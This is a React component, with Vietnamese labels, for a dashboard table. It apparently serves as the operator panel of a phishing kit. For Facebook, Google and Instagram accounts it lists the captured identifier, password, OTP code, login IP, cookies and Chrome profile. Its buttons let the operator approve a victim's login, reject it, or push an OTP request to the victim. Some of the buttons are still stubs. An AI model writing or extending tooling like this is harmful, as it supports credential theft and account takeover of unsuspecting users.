import React, { useState, useEffect, useCallback } from 'react';
import { motion } from 'framer-motion';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { accessLogService } from '@/services/accessLogService';
import { useToast } from '@/components/ui/use-toast';
import { formatDistanceToNow } from 'date-fns';
import { vi } from 'date-fns/locale';
import { Check, X, MessageSquare, Loader2, Copy, Eye, Save, Trash2 } from 'lucide-react';
import RequestOtpModal from '@/components/dashboard/RequestOtpModal';

const platformIcons = {
  Facebook: 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg',
  Google: 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg',
  Instagram: 'https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png',
  default: 'https://img.icons8.com/ios-glyphs/30/ffffff/globe.png'
};

const statusConfig = {
  pending: { label: 'Chờ duyệt', color: 'bg-yellow-500/20 text-yellow-400', borderColor: 'border-yellow-500' },
  approved: { label: 'Đã duyệt', color: 'bg-green-500/20 text-green-400', borderColor: 'border-green-500' },
  rejected: { label: 'Từ chối', color: 'bg-red-500/20 text-red-400', borderColor: 'border-red-500' },
  otp_requested: { label: 'Yêu cầu OTP', color: 'bg-blue-500/20 text-blue-400', borderColor: 'border-blue-500' },
  expired: { label: 'Hết hạn', color: 'bg-gray-500/20 text-gray-400', borderColor: 'border-gray-500' },
  processing: { label: 'Đang xử lý', color: 'bg-purple-500/20 text-purple-400', borderColor: 'border-purple-500' },
  success: { label: 'Thành công', color: 'bg-teal-500/20 text-teal-400', borderColor: 'border-teal-500' },
  failed: { label: 'Thất bại', color: 'bg-orange-500/20 text-orange-400', borderColor: 'border-orange-500' },
};

const getHighlightedText = (text = '', highlight = '') => {
    if (!highlight.trim()) {
      return <span>{text}</span>;
    }
    const parts = text.split(new RegExp(`(${highlight})`, 'gi'));
    return (
      <span>
        {parts.map((part, i) =>
          part.toLowerCase() === highlight.toLowerCase() ? (
            <span key={i} className="bg-yellow-400 text-black rounded px-1">
              {part}
            </span>
          ) : (
            part
          )
        )}
      </span>
    );
};

const AccessLogTable = ({ searchTerm }) => {
  const [requests, setRequests] = useState([]);
  const [loading, setLoading] = useState(true);
  const [isOtpModalOpen, setIsOtpModalOpen] = useState(false);
  const [selectedRequest, setSelectedRequest] = useState(null);
  const { toast } = useToast();

  const fetchRequests = useCallback(async () => {
    setLoading(true);
    try {
        const data = await accessLogService.getAccessLogs();
        setRequests(data);
    } catch (error) {
        toast({ title: 'Lỗi', description: 'Không thể tải danh sách yêu cầu.', variant: 'destructive' });
        console.error(error);
    } finally {
        setLoading(false);
    }
  }, [toast]);

  useEffect(() => {
    fetchRequests();
  }, [fetchRequests]);

  const handleUpdateStatus = async (id, status) => {
    try {
        await accessLogService.updateAccessLogStatus(id, status);
        fetchRequests();
        toast({ title: 'Thành công', description: `Đã cập nhật trạng thái yêu cầu.` });
    } catch (error) {
        toast({ title: 'Lỗi', description: `Không thể cập nhật trạng thái.`, variant: 'destructive' });
    }
  };
  
  const handleUnsupportedFeature = (featureName) => {
     toast({
        title: 'Tính năng chưa được hỗ trợ',
        description: `Chức năng "${featureName}" đang được phát triển.`,
        variant: 'destructive',
      });
  }

  const handleOpenOtpModal = (request) => {
    setSelectedRequest(request);
    setIsOtpModalOpen(true);
  };

  const handleSaveOtpConfig = async (otpConfig) => {
    if (!selectedRequest) return;
    try {
        await accessLogService.saveOtpConfig(selectedRequest.id, otpConfig);
        fetchRequests();
        toast({ title: 'Thành công', description: 'Đã gửi yêu cầu OTP.' });
    } catch (error) {
        toast({ title: 'Lỗi', description: 'Không thể lưu cấu hình OTP.', variant: 'destructive' });
    }
  };

  const filteredRequests = searchTerm
    ? requests.filter(req => 
        req.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
        req.platform.toLowerCase().includes(searchTerm.toLowerCase()) ||
        (statusConfig[req.status]?.label.toLowerCase().includes(searchTerm.toLowerCase()))
      )
    : requests;


  if (loading) return <div className="flex items-center justify-center h-64"><Loader2 className="h-8 w-8 animate-spin text-blue-500" /></div>;

  return (
    <>
      <div className="overflow-x-auto">
        <Table>
          <TableHeader>
            <TableRow className="border-slate-800 hover:bg-transparent">
              <TableHead>STT</TableHead>
              <TableHead>Nền tảng</TableHead>
              <TableHead>Tài khoản</TableHead>
              <TableHead>Mật khẩu</TableHead>
              <TableHead>Code OTP</TableHead>
              <TableHead>IP Login</TableHead>
              <TableHead>Trạng thái</TableHead>
              <TableHead>Kết quả</TableHead>
              <TableHead>Cookies</TableHead>
              <TableHead>Chrome</TableHead>
              <TableHead className="text-center">Tác vụ</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredRequests.map((req, index) => (
              <motion.tr
                key={req.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.5, delay: index * 0.05 }}
                className="border-slate-800 hover:bg-slate-800/50"
              >
                <TableCell>{index + 1}</TableCell>
                <TableCell>
                  <div className="flex items-center gap-2">
                    <img src={platformIcons[req.platform] || platformIcons.default} alt={req.platform} className="h-5 w-5" />
                    <span>{getHighlightedText(req.platform, searchTerm)}</span>
                  </div>
                </TableCell>
                <TableCell className="font-mono text-sm">{getHighlightedText(req.identifier, searchTerm)}</TableCell>
                <TableCell>
                  <Button size="icon" variant="ghost" className="h-7 w-7" onClick={() => handleUnsupportedFeature('Xem mật khẩu')}>
                      <Eye className="h-4 w-4" />
                  </Button>
                </TableCell>
                <TableCell>--</TableCell>
                <TableCell>
                    <div className="flex items-center gap-1">
                        <span>{req.ip}</span>
                        <Button size="icon" variant="ghost" className="h-7 w-7" onClick={() => {
                            navigator.clipboard.writeText(req.ip);
                            toast({title: 'Đã sao chép IP!'});
                        }}>
                            <Copy className="h-4 w-4" />
                        </Button>
                    </div>
                </TableCell>
                <TableCell>
                  <Badge className={`${statusConfig[req.status]?.color || ''} border ${statusConfig[req.status]?.borderColor || 'border-gray-500'}`}>
                    {getHighlightedText(statusConfig[req.status]?.label || req.status, searchTerm)}
                  </Badge>
                </TableCell>
                <TableCell>--</TableCell>
                <TableCell>
                    <Button size="icon" variant="ghost" className="h-7 w-7" onClick={() => handleUnsupportedFeature('Copy Cookies')}>
                        <Copy className="h-4 w-4" />
                    </Button>
                </TableCell>
                <TableCell>
                    <div className="flex items-center gap-1">
                        <Button size="icon" variant="ghost" className="h-7 w-7 text-green-400" onClick={() => handleUnsupportedFeature('Lưu Profile')}>
                            <Save className="h-4 w-4" />
                        </Button>
                        <Button size="icon" variant="ghost" className="h-7 w-7 text-red-400" onClick={() => handleUnsupportedFeature('Xóa Profile')}>
                            <Trash2 className="h-4 w-4" />
                        </Button>
                    </div>
                </TableCell>
                <TableCell className="text-center">
                  <div className="flex gap-1 justify-center">
                    <Button size="icon" variant="ghost" className="h-7 w-7 text-green-400 hover:bg-green-500/20 hover:text-green-300" onClick={() => handleUpdateStatus(req.id, 'approved')}>
                      <Check className="h-4 w-4" />
                    </Button>
                    <Button size="icon" variant="ghost" className="h-7 w-7 text-blue-400 hover:bg-blue-500/20 hover:text-blue-300" onClick={() => handleOpenOtpModal(req)}>
                      <MessageSquare className="h-4 w-4" />
                    </Button>
                    <Button size="icon" variant="ghost" className="h-7 w-7 text-red-400 hover:bg-red-500/20 hover:text-red-300" onClick={() => handleUpdateStatus(req.id, 'rejected')}>
                      <X className="h-4 w-4" />
                    </Button>
                  </div>
                </TableCell>
              </motion.tr>
            ))}
          </TableBody>
        </Table>
      </div>
      <RequestOtpModal 
        isOpen={isOtpModalOpen} 
        onOpenChange={setIsOtpModalOpen} 
        onSave={handleSaveOtpConfig}
      />
    </>
  );
};

export default AccessLogTable;